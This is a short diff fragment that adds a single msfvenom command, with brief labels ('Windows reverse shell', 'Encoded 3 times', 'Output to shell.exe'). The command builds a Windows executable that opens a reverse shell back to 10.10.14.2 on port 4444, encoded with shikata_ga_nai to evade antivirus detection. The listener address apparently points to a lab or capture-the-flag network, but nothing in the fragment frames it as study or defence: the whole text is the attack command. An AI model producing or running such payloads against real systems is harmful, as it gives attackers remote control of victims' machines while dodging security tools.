@@ -1,1 +1,7 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 -o shell.exe
 
+  Windows reverse shell
+
+  Encoded 3 times
+
+  Output to shell.exe
